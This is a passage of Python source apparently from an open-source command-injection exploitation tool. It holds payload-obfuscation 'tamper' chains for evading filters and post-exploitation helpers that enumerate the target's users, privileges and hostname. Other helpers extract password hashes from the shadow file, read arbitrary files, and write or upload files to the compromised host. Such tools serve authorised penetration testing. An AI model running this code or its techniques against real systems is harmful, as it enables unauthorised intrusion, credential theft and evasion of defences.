    if mod_type == 'randomcase':
      from src.core.tamper import randomcase
      payload = randomcase.tamper(payload)

  for print_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # printf to echo (for ascii to dec)
    if print_type == 'printf2echo':
      from src.core.tamper import printf2echo
      payload = printf2echo.tamper(payload)

  for sleep_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # sleep to timeout
    if sleep_type == 'sleep2timeout':
      from src.core.tamper import sleep2timeout
      payload = sleep2timeout.tamper(payload)
    # sleep to usleep
    if sleep_type == 'sleep2usleep':
      from src.core.tamper import sleep2usleep
      payload = sleep2usleep.tamper(payload)

  for quotes_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # Add double-quotes.
    if quotes_type == 'doublequotes':
      from src.core.tamper import doublequotes
      payload = doublequotes.tamper(payload)
    # Add single-quotes.
    if quotes_type == 'singlequotes':
      from src.core.tamper import singlequotes
      payload = singlequotes.tamper(payload)

  for mod_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # Add uninitialized variable.
    if mod_type == 'uninitializedvariable':
      from src.core.tamper import uninitializedvariable
      payload = uninitializedvariable.tamper(payload)
    if mod_type == 'slash2env':
      from src.core.tamper import slash2env
      payload = slash2env.tamper(payload)
    # Add backslashes.
    if mod_type == 'backslashes':
      from src.core.tamper import backslashes
      payload = backslashes.tamper(payload)
    # Add caret symbol.
    if mod_type == 'caret':
      from src.core.tamper import caret
      payload = caret.tamper(payload)
    # Transfomation to nested command
    if mod_type == 'nested':
      from src.core.tamper import nested
      payload = nested.tamper(payload)
    # Add dollar sign followed by an at-sign.
    if mod_type == 'dollaratsigns':
      from src.core.tamper import dollaratsigns
      payload = dollaratsigns.tamper(payload)

  for space_mod in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # Encode spaces.
    if space_mod == 'space2ifs':
      from src.core.tamper import space2ifs
      payload = space2ifs.tamper(payload)
    if space_mod == 'space2plus':
      from src.core.tamper import space2plus
      payload = space2plus.tamper(payload)
    if space_mod == 'space2htab':
      from src.core.tamper import space2htab
      payload = space2htab.tamper(payload)
    if space_mod == 'space2vtab':
      from src.core.tamper import space2vtab
      payload = space2vtab.tamper(payload)
    if space_mod == 'multiplespaces':
      from src.core.tamper import multiplespaces
      payload = multiplespaces.tamper(payload)

  for encode_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # Encode payload to hex format.
    if encode_type == 'base64encode':
      from src.core.tamper import base64encode
      payload = base64encode.tamper(payload)
    # Encode payload to hex format.
    if encode_type == 'hexencode':
      from src.core.tamper import hexencode
      payload = hexencode.tamper(payload)

  return payload

"""
Skip parameters when the provided value is empty.
"""
def skip_empty(empty_parameters, http_request_method):
  warn_msg = "The " + http_request_method
  warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]
  warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
  warn_msg += " '" + empty_parameters + "'"
  warn_msg += (' have ', ' has ')[len(empty_parameters.split(",")) == 1]
  warn_msg += "been skipped from testing"
  warn_msg += " because user specified testing of only parameter(s) with non-empty value" + "s"[len(empty_parameters.split(",")) == 1:][::-1] + "."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))


"""
Parsing and unflattening json data.
"""
def json_data(data):
  data = json.loads(data, object_pairs_hook=OrderedDict)
  data = unflatten_list(data)
  data = json.dumps(data)
  return data

"""
"No parameter(s) found for testing.
"""
def no_parameters_found():
  err_msg = "No parameter(s) found for testing in the provided data "
  err_msg += "(e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). "
  if not menu.options.crawldepth:
    err_msg += "You are advised to rerun with '--crawl=2'."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
  raise SystemExit()

"""
Check if the provided value is empty.
"""
def is_empty(multi_parameters, http_request_method):
  all_empty = False
  empty_parameters = []
  multi_params = [s for s in multi_parameters]
  if settings.IS_JSON:
    try:
      multi_params = flatten(json.loads(','.join(multi_params), object_pairs_hook=OrderedDict)) if is_JSON_check(','.join(multi_params)) else multi_params
      # multi_params = ','.join(multi_params)
      # if is_JSON_check(multi_params):
      #   json_data = json.loads(multi_params, object_pairs_hook=OrderedDict)
      #   multi_params = flatten(json_data)
    except ValueError as err_msg:
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
  for empty in multi_params:
    try:
      if settings.IS_JSON:
        try:
          if len(str(multi_params[empty])) == 0 :
            empty_parameters.append(empty)
        except TypeError:
          pass
      elif settings.IS_XML:
        if re.findall(r'>(.*)<', empty)[0] == "" or \
           re.findall(r'>(.*)<', empty)[0] == settings.SINGLE_WHITESPACE:
          empty_parameters.append(re.findall(r'</(.*)>', empty)[0])
      elif len(empty.split("=")[1]) == 0:
        empty_parameters.append(empty.split("=")[0])
    except IndexError:
      pass

  if len(empty_parameters) == len(multi_parameters):
    all_empty = True
    
  if menu.options.skip_empty:
    settings.SKIP_PARAMETER = empty_parameters

  empty_parameters = ", ".join(empty_parameters)
  if len(empty_parameters) > 0:
    if menu.options.skip_empty:
      skip_empty(empty_parameters, http_request_method)
      if all_empty:
        return all_empty
      else:
        return False
    else:
      warn_msg = "The provided value" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
      warn_msg += " for " + http_request_method
      warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]
      warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
      warn_msg += " '" + empty_parameters + "'"
      warn_msg += (' are ', ' is ')[len(empty_parameters.split(",")) == 1] + "empty. "
      warn_msg += "You are advised to use only valid values, so " + settings.APPLICATION
      warn_msg += " could be able to run properly."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      return False

# Check if valid SOAP/XML
def is_XML_check(parameter):
  try:
    if re.search(settings.XML_RECOGNITION_REGEX, parameter):
      return True
  except ValueError as err_msg:
    return False

#Check if INJECT_TAG is enclosed in quotes (in json data)
def check_quotes_json_data(data):
  if not json.dumps(settings.INJECT_TAG) in data:
    data = data.replace(settings.INJECT_TAG, json.dumps(settings.INJECT_TAG))
  return data

# Check if valid JSON
def is_JSON_check(parameter):
  try:
    # Attempt to load the JSON string
    json_object = json.loads(parameter.replace(settings.INJECT_TAG,""))
    settings.IS_VALID_JSON = True
    return settings.IS_VALID_JSON
  except json.JSONDecodeError as err_msg:
    # Handle JSONDecodeError and identify common issues
    if settings.IS_JSON and not settings.IS_VALID_JSON:
      error_str = str(err_msg)
      if "No JSON object could be decoded" in error_str:
          err_msg = "JSON is invalid. No valid JSON object found."
      elif "Expecting" in error_str and any(_ in error_str for _ in ("value", "delimiter")):
          err_msg = "JSON parsing error: " + error_str + ". Check for missing commas, colons, or improperly escaped characters."
      elif "Expecting" in error_str and "end of data" in error_str:
          err_msg = "JSON parsing error: " + error_str + ". Check for extra commas or missing closing brackets."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()


# Process with JSON data
def process_data(data_type, http_request_method):
  while True:
    info_msg = str(data_type) + " data found in " + str(http_request_method) + " body."
    message = info_msg
    message += " Do you want to process it? [Y/n] > "
    process = common.read_input(message, default="Y", check_batch=True)
    if process in settings.CHOICE_YES:
      return True
    elif process in settings.CHOICE_NO:
      settings.IGNORE_USER_DEFINED_POST_DATA = True
      return False
    elif process in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(process)
      pass

"""
Check for similarity in provided parameter name and value.
"""
def check_similarities(all_params):
  if settings.IS_JSON:
    try:
      _ = "".join(random.sample(string.ascii_uppercase, k=6))
      all_params = flatten(json.loads(','.join(all_params), object_pairs_hook=OrderedDict))
      for param in all_params:
        if isinstance(all_params[param], str):
          if all_params[param] in param:
            all_params[param] = all_params[param] + settings.RANDOM_TAG
          if settings.SINGLE_WHITESPACE in all_params[param]:
            all_params[param] = all_params[param].replace(settings.SINGLE_WHITESPACE, _)
      all_params = [x.replace(settings.SINGLE_WHITESPACE, "").replace(_, settings.SINGLE_WHITESPACE) for x in json.dumps(all_params).split(", ")]
    except Exception:
      pass
  else:
    for param in range(0, len(all_params)):
      if settings.IS_XML:
        if re.findall(r'>(.*)</', all_params[param]):
          if re.findall(r'>(.*)</', all_params[param])[0] in re.findall(r'</(.*)>', all_params[param])[0]:
            parameter_name = ''.join(re.findall(r'</(.*)>', all_params[param]))
            parameter_value = ''.join(re.findall(r'>(.*)</', all_params[param]))
            all_params[param] = "<" + parameter_name + ">" + parameter_value + settings.RANDOM_TAG + "</" + parameter_name + ">"
      else:
        if re.findall(r'(.*)=', all_params[param]) == re.findall(r'=(.*)', all_params[param]):
          parameter_name = ''.join(re.findall(r'=(.*)', all_params[param]))
          if parameter_name:
            all_params[param] = parameter_name + "=" + parameter_name + settings.RANDOM_TAG
        elif re.findall(r'=(.*)', all_params[param])[0] in re.findall(r'(.*)=', all_params[param])[0]:
          parameter_name = ''.join(re.findall(r'(.*)=', all_params[param]))
          parameter_value = ''.join(re.findall(r'=(.*)', all_params[param]))
          all_params[param] = parameter_name + "=" + parameter_value + settings.RANDOM_TAG

  all_params = [x for x in all_params if x is not None]
  return all_params

"""
Gererate characters pool (for blind command injections)
"""
def generate_char_pool(num_of_chars):
  if menu.options.charset:
    char_pool = [ord(c) for c in menu.options.charset]
  else:
    # Source for letter frequency: http://en.wikipedia.org/wiki/Letter_frequency#Relative_frequencies_of_letters_in_the_English_language
    if num_of_chars == 1:
      char_pool = [69, 84, 65, 79, 73, 78, 83, 72, 82, 68, 76, 67, 85, 77, 87, 70, 71, 89, 80, 66, 86, 75, 74, 88, 81, 90] + \
                  [101, 116, 97, 111, 105, 110, 115, 104, 114, 100, 108, 99, 117, 109, 119, 102, 103, 121, 112, 98, 118, 107, 106, 120, 113, 122]
    else:
      char_pool = [101, 116, 97, 111, 105, 110, 115, 104, 114, 100, 108, 99, 117, 109, 119, 102, 103, 121, 112, 98, 118, 107, 106, 120, 113, 122] + \
                  [69, 84, 65, 79, 73, 78, 83, 72, 82, 68, 76, 67, 85, 77, 87, 70, 71, 89, 80, 66, 86, 75, 74, 88, 81, 90]
    char_pool = char_pool + list(range(49, 57)) + list(range(32, 48)) + list(range(91, 96)) + list(range(58, 64))  + list(range(123, 127))
  return char_pool
  
"""
Print powershell version
"""
def print_ps_version(ps_version, filename, _):
  try:
    settings.PS_ENABLED = True
    ps_version = "".join(str(p) for p in ps_version)
    if settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    # Output PowerShell's version number
    info_msg = "Powershell version: " + ps_version
    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file.
    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
      if not menu.options.no_logging:
        info_msg = "Powershell version: " + ps_version + "\n"
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
  except ValueError:
    warn_msg = "Failed to identify the version of Powershell, "
    warn_msg += "which means that some payloads or injection techniques may be failed."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    settings.PS_ENABLED = False
    ps_check_failed()

"""
Print hostname
"""
def print_hostname(shell, filename, _):
  if shell:
    if settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    info_msg = "Hostname: " +  str(shell)
    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file.
    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
      if not menu.options.no_logging:
        info_msg = info_msg + "\n"
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
  else:
    warn_msg = "Failed to identify the hostname."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Print current user info
"""
def print_current_user(cu_account, filename, _):
  if cu_account:
    if settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    info_msg = "Current user: " +  str(cu_account)
    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file.
    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
      if not menu.options.no_logging:
        info_msg = info_msg + "\n"
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
  else:
    warn_msg = "Failed to fetch the current user."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Print current user privs
"""
def print_current_user_privs(shell, filename, _):
  priv = "True"
  if (settings.TARGET_OS == settings.OS.WINDOWS and not "Admin" in shell) or \
     (settings.TARGET_OS != settings.OS.WINDOWS and shell != "0"):
    priv = "False"

  if settings.VERBOSITY_LEVEL == 0 and _:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)

  info_msg = "Current user has elevated privileges: " +  str(priv)
  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
  # Add infos to logs file.
  with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
    if not menu.options.no_logging:
      info_msg = info_msg + "\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
"""
Print OS info
"""
def print_os_info(target_os, target_arch, filename, _):
  if target_os and target_arch:
    if settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    info_msg = "Operating system: " +  str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch)
    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file.
    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
      if not menu.options.no_logging:
        info_msg = info_msg + "\n"
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
  else:
    warn_msg = "Failed to fetch underlying operating system information."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Print enumeration info msgs
"""
class print_enumenation():
  def ps_version_msg(self):
    info_msg = "Fetching powershell version."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  def hostname_msg(self):
    info_msg = "Fetching hostname."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  def current_user_msg(self):
    info_msg = "Fetching current user."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  def check_privs_msg(self):
    info_msg = "Testing whether the current user has elevated privileges."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  def os_info_msg(self):
    info_msg = "Fetching underlying operating system information."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  def print_users_msg(self):
    if settings.TARGET_OS == settings.OS.WINDOWS:
      info_msg = "Executing the 'net user' command "
    else:
      info_msg = "Fetching contents of the file '" + settings.PASSWD_FILE + "' "
    info_msg += "to enumerate operating system users. "
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  def print_passes_msg(self):
    info_msg = "Fetching contents of the file '" + settings.SHADOW_FILE + "' "
    info_msg += "to enumerate operating system users password hashes. "
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  def print_single_os_cmd_msg(self, cmd):
    info_msg =  "Executing user-supplied command '" + cmd + "'."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Print users enumeration.
"""
def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
  # Windows users enumeration.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    try:
      if sys_users and any(account in sys_users for account in settings.DEFAULT_WIN_USERS):
        sys_users = "".join(str(p) for p in sys_users).strip()
        sys_users_list = re.findall(r"(.*)", sys_users)
        sys_users_list = "".join(str(p) for p in sys_users_list).strip()
        sys_users_list = ' '.join(sys_users_list.split())
        sys_users_list = sys_users_list.split()
        if len(sys_users_list) != 0 :
          if settings.VERBOSITY_LEVEL == 0 and _:
            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
          info_msg = "Identified operating system"
          info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
          info_msg += " [" + str(len(sys_users_list)) + "]:"
          settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
          # Add infos to logs file.
          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
            if not menu.options.no_logging:
              output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
          count = 0
          for user in range(0, len(sys_users_list)):
            count = count + 1
            is_privileged = is_privileged = ""
            settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL)
            # Add infos to logs file.
            with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
              if not menu.options.no_logging:
                if count == 1 :
                  output_file.write("\n")
                output_file.write("(" +str(count)+ ") '" + sys_users_list[user] + is_privileged + "'\n" )
      else:
        # settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
        warn_msg = "It seems you do not have permission to enumerate operating system users."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    except TypeError:
      pass
    except IndexError:
      # settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      warn_msg = "It seems you do not have permission to enumerate operating system users."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      pass

  # Unix-like users enumeration.
  else:
    try:
      if sys_users:
        sys_users = "".join(str(p) for p in sys_users).strip()
        if len(sys_users.split(settings.SINGLE_WHITESPACE)) <= 1 :
          sys_users = sys_users.split("\n")
        else:
          sys_users = sys_users.split(settings.SINGLE_WHITESPACE)
        # Check for appropriate '/etc/passwd' format.
        if len(sys_users) % 3 != 0 :
          warn_msg = "It seems '" + settings.PASSWD_FILE + "' file is "
          warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
          settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          sys_users = " ".join(str(p) for p in sys_users).strip()
          settings.print_data_to_stdout(sys_users)
          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
            if not menu.options.no_logging:
              output_file.write("      " + sys_users)
        else:
          sys_users_list = []
          for user in range(0, len(sys_users), 3):
             sys_users_list.append(sys_users[user : user + 3])
          if len(sys_users_list) != 0 :
            if settings.VERBOSITY_LEVEL == 0 and _:
              settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
            info_msg = "Identified operating system"
            info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
            info_msg += " [" + str(len(sys_users_list)) + "]:"
            settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
            # Add infos to logs file.
            with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
              if not menu.options.no_logging:
                output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
            count = 0
            for user in range(0, len(sys_users_list)):
              sys_users = sys_users_list[user]
              sys_users = ":".join(str(p) for p in sys_users)
              count = count + 1
              fields = sys_users.split(":")
              fields1 = "".join(str(p) for p in fields)
              # System users privileges enumeration
              try:
                if not fields[2].startswith("/"):
                  raise ValueError()
                if menu.options.privileges:
                  if int(fields[1]) == 0:
                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " root user "
                    is_privileged_nh = " is root user "
                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " system user "
                    is_privileged_nh = " is system user "
                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " anonymous user "
                      is_privileged_nh = " is anonymous user "
                    elif int(fields[1]) == 60002:
                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " non-trusted user "
                      is_privileged_nh = " is non-trusted user "
                    else:
                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " regular user "
                      is_privileged_nh = " is regular user "
                  else :
                    is_privileged = ""
                    is_privileged_nh = ""
                else :
                  is_privileged = ""
                  is_privileged_nh = ""
                settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "' " + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.")
                # Add infos to logs file.
                with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
                  if not menu.options.no_logging:
                    if count == 1 :
                      output_file.write("\n")
                    output_file.write("(" +str(count)+ ") '" + fields[0] + "' " + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
              except ValueError:
                if count == 1 :
                  warn_msg = "It seems '" + settings.PASSWD_FILE + "' file is not in the "
                  warn_msg += "appropriate format. Thus, it is expoted as a text file."
                  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
                sys_users = " ".join(str(p) for p in sys_users.split(":"))
                settings.print_data_to_stdout(sys_users)
                with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
                  if not menu.options.no_logging:
                    output_file.write("      " + sys_users)
      else:
        warn_msg = "It seems you do not have permission "
        warn_msg += "to read the contents of the file '" + settings.PASSWD_FILE + "'."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    except TypeError:
      pass
    except IndexError:
      warn_msg = "Some kind of WAF/IPS probably blocks the attempt to read '"
      warn_msg += settings.PASSWD_FILE + "' to enumerate operating system users."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      pass

"""
Print users enumeration.
"""
def print_passes(sys_passes, filename, _, alter_shell):
  if sys_passes == "":
    sys_passes = settings.SINGLE_WHITESPACE
    sys_passes = sys_passes.replace(settings.SINGLE_WHITESPACE, "\n").split()
    if len(sys_passes) != 0 :
      if settings.VERBOSITY_LEVEL == 0 and _:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      info_msg = "Identified operating system"
      info_msg += " user" + ('s', '')[len(sys_passes) == 1]
      info_msg += " password hashes [" + str(len(sys_passes)) + "]:"
      settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
      # Add infos to logs file.
      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
        if not menu.options.no_logging:
          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
      count = 0
      for line in sys_passes:
        count = count + 1
        try:
          if ":" in line:
            fields = line.split(":")
            if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
              settings.print_data_to_stdout("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
              # Add infos to logs file.
              with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
                if not menu.options.no_logging:
                  if count == 1 :
                    output_file.write("\n")
                  output_file.write("(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
        # Check for appropriate '/etc/shadow' format.
        except IndexError:
          if count == 1 :
            warn_msg = "It seems '" + settings.SHADOW_FILE + "' file is not "
            warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
            settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          settings.print_data_to_stdout(fields[0])
          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
            if not menu.options.no_logging:
              output_file.write("      " + fields[0])
    else:
      warn_msg = "It seems you do not have permission "
      warn_msg += "to read the contents of the file '" + settings.SHADOW_FILE + "'."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Print single OS command
"""
def print_single_os_cmd(cmd, output, filename):
  if len(output) > 1:
    _ = "'" + cmd + "' execution output"
    settings.print_data_to_stdout(settings.print_retrieved_data(_, output))
    try:
      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
        if not menu.options.no_logging:
          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + "User-supplied command " + _ + ": " + str(output.encode(settings.DEFAULT_CODEC).decode()) + "\n")
    except TypeError:
      pass
  else:
    err_msg = common.invalid_cmd_output(cmd)
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))

"""
Quote provided cmd
"""
def quoted_cmd(cmd):
  cmd = "\"" + cmd + "\""
  return cmd

"""
Add new "cmd /c"
"""
def add_new_cmd(cmd):
  cmd = "cmd /c " + cmd
  return cmd

"""
Escape single quoted cmd
"""
def escape_single_quoted_cmd(cmd):
  cmd = cmd.replace("'","\\'")
  return cmd

"""
Find filename
"""
def find_filename(dest_to_write, content):
  fname = os.path.basename(dest_to_write)
  tmp_fname = fname + "_tmp"
  # _ = settings.FILE_WRITE
  if settings.TARGET_OS == settings.OS.WINDOWS:
    # _ = settings.FILE_WRITE_WIN
    cmd = settings.WIN_FILE_WRITE_OPERATOR  + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
  else:
    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + tmp_fname
  return fname, tmp_fname, cmd

"""
Decode base 64 encoding
"""
def win_decode_b64_enc(fname, tmp_fname):
  cmd = settings.CERTUTIL_DECODE_CMD + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + fname.replace("\\","\\\\")
  return cmd

"""
Add command substitution on provided command
"""
def add_command_substitution(cmd):
  cmd = "echo $(" + cmd + ")"
  return cmd

"""
Remove command substitution on provided command
"""
def remove_command_substitution(cmd):
  cmd = cmd.replace("echo $(", "").replace(")", "")
  return cmd

def remove_parenthesis(cmd):
  cmd = cmd.replace("(", "").replace(")", "")
  return cmd

"""
Write the file content
"""
def write_content(content, dest_to_write):
  content = quoted_cmd(content)
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_FILE_WRITE_OPERATOR  + dest_to_write.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
  else:
    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + dest_to_write
  return cmd

"""
Delete filename
"""
def delete_tmp(tmp_fname):
  cmd = settings.WIN_DEL + tmp_fname.replace("\\","\\\\")
  return cmd

"""
Check if file exists.
"""
def check_file(dest_to_upload):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.FILE_LIST_WIN + dest_to_upload.replace("\\","\\\\")
  else:
    cmd = settings.FILE_LIST + dest_to_upload
    cmd = add_command_substitution(cmd)
  return cmd

"""
Change directory
"""
def change_dir(dest_to_write):
  dest_to_write = dest_to_write.replace("\\","/")
  path = os.path.dirname(dest_to_write)
  path = path.replace("/","\\")
  cmd = "cd " + path
  return cmd

"""
File content to read.
"""
def file_content_to_read():
  file_to_read = menu.options.file_read.encode(settings.DEFAULT_CODEC).decode()
  info_msg = "Fetching contents of the file: '"
  info_msg += file_to_read + "'."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_FILE_READ + file_to_read.replace("\\","\\\\")
  else:
    if settings.EVAL_BASED_STATE:
      cmd = "(" + settings.FILE_READ + file_to_read + ")"
    else:
      cmd = settings.FILE_READ + file_to_read
  return cmd, file_to_read

"""
File read status
"""
def file_read_status(shell, file_to_read, filename):
  if shell:
    _ = "Retrieved file content"
    settings.print_data_to_stdout(settings.print_retrieved_data(_, shell))
    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
      if not menu.options.no_logging:
        info_msg = "Extracted content of the file '"
        info_msg += file_to_read + "' : " + shell + "\n"
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
  else:
    warn_msg = "It seems you do not have permission "
    warn_msg += "to read the contents of the file '" + file_to_read + "'."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Check upload/write destination
"""
def check_destination(destination):
  if menu.options.file_write:
    where = menu.options.file_write
  else:
    where = menu.options.file_upload
  if os.path.split(destination)[1] == "" :
    _ = os.path.split(destination)[0] + "/" + os.path.split(where)[1]
  elif os.path.split(destination)[0] == "/":
    _ = "/" + os.path.split(destination)[1] + "/" + os.path.split(where)[1]
  elif os.path.split(destination)[0] == "\\":
    _ = "\\" + os.path.split(destination)[1] + "\\" + os.path.split(where)[1]
  else:
    _ = destination
  return _

"""
Write the content of a local file to a remote destination.
"""
def check_file_to_write():
  file_to_write = menu.options.file_write.encode(settings.DEFAULT_CODEC).decode()
  if not os.path.exists(file_to_write):
    err_msg = "The specified local file '" + file_to_write + "' does not exist."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", settings.SINGLE_WHITESPACE) for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
    if settings.TARGET_OS == settings.OS.WINDOWS:
      import base64
      content = base64.b64encode(content.encode(settings.DEFAULT_CODEC)).decode()
  else:
    warn_msg = "The specified path '" + file_to_write + "' is not a file."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)

